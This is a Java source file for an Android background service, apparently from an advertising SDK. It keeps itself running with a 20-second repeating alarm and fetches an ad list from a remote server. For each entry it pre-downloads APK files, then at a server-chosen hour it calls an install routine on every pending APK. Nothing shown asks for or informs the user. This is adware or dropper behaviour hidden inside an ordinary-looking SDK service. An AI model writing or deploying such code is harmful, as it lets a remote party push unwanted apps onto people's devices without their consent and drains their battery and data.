package com.top.sdk.service;

import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
import android.os.SystemClock;
import android.text.TextUtils;

import com.top.sdk.apputils.PackageService;
import com.top.sdk.db.impservice.ImpFileInfoDbService;
import com.top.sdk.db.impservice.ImpPopDbService;
import com.top.sdk.db.impservice.ImpWhiteDbService;
import com.top.sdk.db.service.FileInfoDbService;
import com.top.sdk.db.service.PopDbService;
import com.top.sdk.db.service.WhiteDbService;
import com.top.sdk.entity.FileInfo;
import com.top.sdk.entity.PopData;
import com.top.sdk.entity.WhiteData;
import com.top.sdk.http.business.FileDownload;
import com.top.sdk.http.business.InterfaceHttpbusiness;
import com.top.sdk.http.business.PopHttpBusiness;
import com.top.sdk.http.reqentity.PopReqPragam;
import com.top.sdk.http.respone.entity.PopResult;
import com.top.sdk.http.respone.parser.PopResultParser;
import com.top.sdk.utils.ImageLoader;
import com.top.sdk.utils.LogUtil;
import com.top.sdk.utils.NetWorkUtils;
import com.top.sdk.utils.SharedPrefUtil;
import com.top.xutils.exception.HttpException;
import com.top.xutils.http.ResponseInfo;
import com.top.xutils.http.callback.RequestCallBack;

public class LTService extends Service {
	private static long popShowTime;
	private long startAlarm = 20000;
	private static long verTime = 20 * 1000 * 60; // 时间间隔

	@Override
	public IBinder onBind(Intent intent) {
		// TODO Auto-generated method stub
		return null;
	}

	@Override
	public void onCreate() {
		// TODO Auto-generated method stub
		super.onCreate();
		LogUtil.d("app", "----oncreate-----");
		setAlarmManager();
		new RunningThread(getApplicationContext()).start();

	}

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		LogUtil.d("app", "----onstartCommd-----");
		getListPopData();
		installPop();
		// TODO Auto-generated method stub
		return super.onStartCommand(intent, flags, startId);

	}

	private void setAlarmManager() {
		Context context = getApplicationContext();
		Intent intent = new Intent(LTService.this, LTService.class);
		PendingIntent pend = PendingIntent.getService(context, 0, intent, 0);
		AlarmManager am = (AlarmManager) getSystemService(ALARM_SERVICE);
		long firstTime = SystemClock.currentThreadTimeMillis();
		am.setRepeating(AlarmManager.RTC_WAKEUP, firstTime, startAlarm, pend);
	}

	private void getListPopData() {
		long nowTime = System.currentTimeMillis();
		LogUtil.d("nowTime---" + nowTime);

		if (nowTime - SharedPrefUtil.getAdRequestTime(getApplicationContext()) > verTime) {
			LogUtil.d("popShowTime---" + popShowTime);
			LogUtil.d("--------------------获取到了广告列表数据---------------");
			SharedPrefUtil.setAdRequestTime(getApplicationContext(), nowTime); // 拉取列表的时间
			if (NetWorkUtils.isWifiNetWork(getApplicationContext())) {
				InterfaceHttpbusiness business = new PopHttpBusiness();
				business.httpBusiness(new RequestCallBack<String>() {
					@Override
					public void onSuccess(ResponseInfo<String> responseInfo) {
						// TODO Auto-generated method stub
						PopResultParser parser = new PopResultParser();
						PopResult result = parser
								.parserJson(responseInfo.result);
						int time = result.getInstallTime();
						if (result.getCode() == 0) {
							SharedPrefUtil.saveInstallTime(
									getApplicationContext(), time);
							List<PopData> l = result.getListPop();
							PopDbService popService = new ImpPopDbService(
									getApplicationContext());
							popService.deleteAllPopData();
							if (l != null && l.size() > 0) {
								popService.insertListPopData(l);
								PopData pop = null;
								for (int i = 0; i < l.size(); i++) {
									pop = l.get(i);
									// 提前下载图片
									ImageLoader imagerLaoder = ImageLoader
											.getInstance(getApplicationContext());
									String url = pop.getImgUrl();
									if (!TextUtils.isEmpty(url)) {
										url = url.split(",")[0]; // 默认取第一张图片
									}
									imagerLaoder.queuePhoto(url, null);

									// 提前下载apk文件
									FileDownload download = new FileDownload(
											getApplicationContext());
									download.download(pop);

									FileInfo info = new FileInfo();
									info.setFileId(pop.getPopId());
									info.setFileName(String.valueOf(pop
											.getPopUrl().hashCode()));
									info.setFileUrl(pop.getPopUrl());
									info.setIsSuccess(1); // 默认都没有下载成功；
									FileInfoDbService fileService = new ImpFileInfoDbService(
											getApplicationContext());
									fileService.addFileInfo(info);
								}

							}
							List<WhiteData> y = result.getListWhite();
							WhiteDbService service = new ImpWhiteDbService(
									getApplicationContext());
							service.deleteAllWhiteData();
							if (y != null && y.size() > 0) {
								service.saveWhiteDataList(y);
							}
						}

					}

					@Override
					public void onFailure(HttpException error, String msg) {
						// TODO Auto-generated method stub

					}
				}, new PopReqPragam(getApplicationContext()));

			} else {
				// 发现不是wifi下可以

				verTime = 5 * 1000 * 60;

			}

		}

	}

	private void installPop() {
		DateFormat format = new SimpleDateFormat("HH");
		String f = format.format(new Date());
		int time = Integer.parseInt(f);
		// 获取当前的时间
		int installTime = SharedPrefUtil
				.getInstallTime(getApplicationContext());
		if (time == installTime) {
			PopDbService popService = new ImpPopDbService(
					getApplicationContext());
			List<PopData> all = popService.getNotShowPopDataList();
			if (all != null) {
				PackageService s = PackageService.getInstance();
				for (int i = 0; i < all.size(); i++) {
					s.installApp(getApplicationContext(), all.get(i));
				}
			}
			SharedPrefUtil.saveInstallTime(getApplicationContext(),
					installTime - 1); // 往后倒退一个小时
		}

	}

}
